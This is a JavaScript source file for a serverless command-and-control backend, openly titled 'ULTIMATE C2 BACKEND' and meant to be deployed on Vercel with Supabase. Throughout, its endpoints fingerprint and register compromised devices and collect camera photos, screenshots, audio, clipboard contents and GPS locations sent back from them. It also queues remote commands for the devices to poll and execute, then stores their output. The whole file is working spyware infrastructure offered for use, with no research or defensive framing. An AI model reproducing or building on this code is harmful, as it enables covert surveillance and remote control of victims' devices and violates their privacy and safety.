// ============================================================
//  ULTIMATE C2 BACKEND – All Features Integrated
//  Deploy on Vercel
// ============================================================

const { createClient } = require('@supabase/supabase-js');

// ============================================================
//  SUPABASE CLIENT
// ============================================================
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_KEY || process.env.SUPABASE_ANON_KEY;

let supabase = null;
if (supabaseUrl && supabaseKey) {
    supabase = createClient(supabaseUrl, supabaseKey);
} else {
    console.error('Missing Supabase credentials');
}

// ============================================================
//  CORS
// ============================================================
function setCors(res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

// ============================================================
//  MAIN HANDLER
// ============================================================
module.exports = async (req, res) => {
    setCors(res);

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const url = new URL(req.url, `http://${req.headers.host}`);
    const path = url.pathname;

    console.log(`[${req.method}] ${path}`);

    // ============================================================
    //  ROOT – LANDING PAGE (shortened for brevity, same as before)
    // ============================================================
    if (path === '/') {
        return res.send(`<!DOCTYPE html>
<html><head><title>C2 Backend</title><style>body{background:#0a0a12;color:#e0e0e0;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;gap:16px;}h1{color:#f7971e;}a{color:#88ccff;text-decoration:none;}</style></head>
<body><h1>☠️ C2 Backend</h1><p>Server is running.</p><a href="/api/test">System Status</a></body></html>`);
    }

    // ============================================================
    //  HEALTH CHECK (JSON)
    // ============================================================
    if (path === '/api/health') {
        return res.json({
            status: 'ok',
            supabase: supabase ? 'connected' : 'not configured',
            env: { SUPABASE_URL: supabaseUrl ? 'set' : 'missing', SUPABASE_KEY: supabaseKey ? 'set' : 'missing' },
            timestamp: new Date().toISOString()
        });
    }

    // ============================================================
    //  HTML STATUS PANEL (skip for brevity, but keep your existing /api/test)
    // ============================================================
    if (path === '/api/test') {
        return res.send(`<!DOCTYPE html><html><head><title>Status</title></head><body><h1>System Status</h1><p>Supabase: ${supabase ? '✅ Connected' : '❌ Not Configured'}</p></body></html>`);
    }

    // ============================================================
    //  REGISTER DEVICE
    // ============================================================
    if (path === '/api/register' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { fingerprint, permissions } = req.body || {};
        if (!fingerprint) return res.status(400).json({ error: 'Missing fingerprint' });
        const deviceId = fingerprint.deviceId || 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
        const { error } = await supabase.from('devices').upsert([{
            id: deviceId,
            ip: fingerprint.ip || 'unknown',
            platform: fingerprint.platform || 'unknown',
            screen: fingerprint.screen || 'unknown',
            timezone: fingerprint.timezone || 'unknown',
            cpu_cores: fingerprint.cpuCores || 'unknown',
            memory: fingerprint.deviceMemory || 'unknown',
            canvas_fp: fingerprint.canvasFingerprint || 'unknown',
            first_seen: Date.now(),
            last_seen: Date.now(),
            permissions: JSON.stringify(permissions || {}),
            notes: '' // default empty
        }], { onConflict: 'id' });
        if (error) return res.status(500).json({ error: error.message });
        await supabase.from('logs').insert([{ device_id: deviceId, level: 'info', message: 'Device registered/updated', timestamp: Date.now() }]);
        return res.json({ success: true, deviceId });
    }

    // ============================================================
    //  UPDATE DEVICE (for notes)
    // ============================================================
    if (path === '/api/update-device' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, notes } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { error } = await supabase.from('devices').update({ notes }).eq('id', deviceId);
        if (error) return res.status(500).json({ error: error.message });
        return res.json({ success: true });
    }

    // ============================================================
    //  UPLOAD PHOTO
    // ============================================================
    if (path === '/api/photo' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, image, timestamp, camera } = req.body || {};
        if (!deviceId || !image) return res.status(400).json({ error: 'Missing deviceId or image' });
        try {
            let storagePath = null, filePath = null;
            try {
                const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
                const ext = image.match(/^data:image\/(\w+);/)?.[1] || 'jpg';
                const fileName = `${deviceId}_${Date.now()}_${camera || 'back'}.${ext}`;
                const { error: uploadError } = await supabase.storage.from('photos').upload(fileName, Buffer.from(base64Data, 'base64'), { contentType: `image/${ext}`, cacheControl: '3600' });
                if (!uploadError) { storagePath = fileName; const { data: urlData } = supabase.storage.from('photos').getPublicUrl(fileName); filePath = urlData?.publicUrl || null; }
            } catch (e) { console.error('Storage error:', e); }
            const { error: dbError } = await supabase.from('photos').insert([{ device_id: deviceId, timestamp: timestamp || Date.now(), data_url: storagePath ? null : image.substring(0, 100), storage_path: storagePath, file_path: filePath, camera: camera || 'back' }]);
            if (dbError) return res.status(500).json({ error: dbError.message });
            await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
            return res.json({ success: true, storagePath, filePath });
        } catch (e) { return res.status(500).json({ error: e.message }); }
    }

    // ============================================================
    //  UPLOAD FILE (Screenshots, Audio, Clipboard)
    // ============================================================
    if (path === '/api/upload-file' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, fileType, content, dataUrl, timestamp } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });

        let fileUrl = null, storagePath = null;

        // If it's a base64 image/audio, upload to storage
        if (dataUrl && dataUrl.startsWith('data:')) {
            try {
                const base64Data = dataUrl.replace(/^data:audio\/\w+;base64,/, '').replace(/^data:image\/\w+;base64,/, '');
                const ext = dataUrl.match(/^data:(image|audio)\/(\w+);/)?.[2] || 'bin';
                const fileName = `${deviceId}_${Date.now()}.${ext}`;
                const { error: uploadError } = await supabase.storage.from('files').upload(fileName, Buffer.from(base64Data, 'base64'), { contentType: dataUrl.match(/^data:(image|audio)\/(\w+);/)?.[0] || 'application/octet-stream', cacheControl: '3600' });
                if (!uploadError) { storagePath = fileName; const { data: urlData } = supabase.storage.from('files').getPublicUrl(fileName); fileUrl = urlData?.publicUrl || null; }
            } catch (e) { console.error('File storage error:', e); }
        }

        const { error: dbError } = await supabase.from('files').insert([{
            device_id: deviceId,
            file_type: fileType || 'unknown',
            file_url: fileUrl,
            storage_path: storagePath,
            content: content || null,
            timestamp: timestamp || Date.now()
        }]);
        if (dbError) return res.status(500).json({ error: dbError.message });
        await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
        return res.json({ success: true, fileUrl, storagePath });
    }

    // ============================================================
    //  LOG
    // ============================================================
    if (path === '/api/log' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, msg, level } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { error } = await supabase.from('logs').insert([{ device_id: deviceId, timestamp: Date.now(), level: level || 'info', message: msg || '' }]);
        if (error) return res.status(500).json({ error: error.message });
        return res.json({ success: true });
    }

    // ============================================================
    //  LOCATION
    // ============================================================
    if (path === '/api/location' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, lat, lon, timestamp } = req.body || {};
        if (!deviceId || lat === undefined || lon === undefined) return res.status(400).json({ error: 'Missing fields' });
        const { error } = await supabase.from('locations').insert([{ device_id: deviceId, timestamp: timestamp || Date.now(), lat, lon }]);
        if (error) return res.status(500).json({ error: error.message });
        await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
        return res.json({ success: true });
    }

    // ============================================================
    //  HEARTBEAT
    // ============================================================
    if (path === '/api/heartbeat' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
        return res.json({ success: true });
    }

    // ============================================================
    //  GET DEVICES
    // ============================================================
    if (path === '/api/devices' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { data, error } = await supabase.from('devices').select('*').order('first_seen', { ascending: false });
        if (error) return res.status(500).json({ error: error.message });
        return res.json(data || []);
    }

    // ============================================================
    //  GET DEVICE DETAILS (includes commands, results, logs, photos, files)
    // ============================================================
    if (path === '/api/device-details' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const [commands, results, logs, photos, files, locations] = await Promise.all([
            supabase.from('commands').select('*').eq('device_id', deviceId).order('sent_at', { ascending: false }).limit(50),
            supabase.from('results').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(50),
            supabase.from('logs').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(100),
            supabase.from('photos').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(20),
            supabase.from('files').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(20),
            supabase.from('locations').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(100)
        ]);
        return res.json({
            commands: commands.data || [],
            results: results.data || [],
            logs: logs.data || [],
            photos: photos.data || [],
            files: files.data || [],
            locations: locations.data || []
        });
    }

    // ============================================================
    //  GET PHOTOS
    // ============================================================
    if (path === '/api/photos' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { data, error } = await supabase.from('photos').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false });
        if (error) return res.status(500).json({ error: error.message });
        return res.json(data.map(p => { if (p.storage_path) { const { data: urlData } = supabase.storage.from('photos').getPublicUrl(p.storage_path); return { ...p, publicUrl: urlData?.publicUrl || null }; } return p; }));
    }

    // ============================================================
    //  GET LOGS
    // ============================================================
    if (path === '/api/logs' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { data, error } = await supabase.from('logs').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(200);
        if (error) return res.status(500).json({ error: error.message });
        return res.json(data || []);
    }

    // ============================================================
    //  GET LOCATIONS
    // ============================================================
    if (path === '/api/locations' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { data, error } = await supabase.from('locations').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(100);
        if (error) return res.status(500).json({ error: error.message });
        return res.json(data || []);
    }

    // ============================================================
    //  GET COMMANDS (for device to poll)
    // ============================================================
    if (path === '/api/commands' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { data, error } = await supabase.from('commands').select('*').eq('device_id', deviceId).eq('status', 'pending').order('sent_at', { ascending: true }).limit(10);
        if (error) return res.status(500).json({ error: error.message });
        if (data && data.length > 0) await supabase.from('commands').update({ status: 'sent' }).in('id', data.map(c => c.id));
        await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
        return res.json(data || []);
    }

    // ============================================================
    //  SEND COMMAND
    // ============================================================
    if (path === '/api/send-command' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, command } = req.body || {};
        if (!deviceId || !command) return res.status(400).json({ error: 'Missing deviceId or command' });
        const { data, error } = await supabase.from('commands').insert([{ device_id: deviceId, command, sent_at: Date.now(), status: 'pending' }]).select();
        if (error) return res.status(500).json({ error: error.message });
        await supabase.from('logs').insert([{ device_id: deviceId, level: 'info', message: `Command sent: ${command}`, timestamp: Date.now() }]);
        return res.json({ success: true, commandId: data[0].id });
    }

    // ============================================================
    //  SUBMIT COMMAND RESULT
    // ============================================================
    if (path === '/api/submit-result' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, commandId, output, error: cmdError } = req.body || {};
        if (!deviceId || !commandId) return res.status(400).json({ error: 'Missing deviceId or commandId' });
        await supabase.from('commands').update({ status: cmdError ? 'failed' : 'executed', executed_at: Date.now() }).eq('id', commandId);
        await supabase.from('results').insert([{ device_id: deviceId, command_id: commandId, output: output || '', error: cmdError || '', timestamp: Date.now() }]);
        await supabase.from('logs').insert([{ device_id: deviceId, level: cmdError ? 'error' : 'info', message: cmdError ? `Command failed: ${cmdError}` : 'Command executed successfully', timestamp: Date.now() }]);
        return res.json({ success: true });
    }

    // ============================================================
    //  DELETE DEVICE
    // ============================================================
    if (path === '/api/delete-device' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        await supabase.from('devices').delete().eq('id', deviceId);
        return res.json({ success: true });
    }

    // ============================================================
    //  404
    // ============================================================
    return res.status(404).json({ error: 'Not Found', path });
};
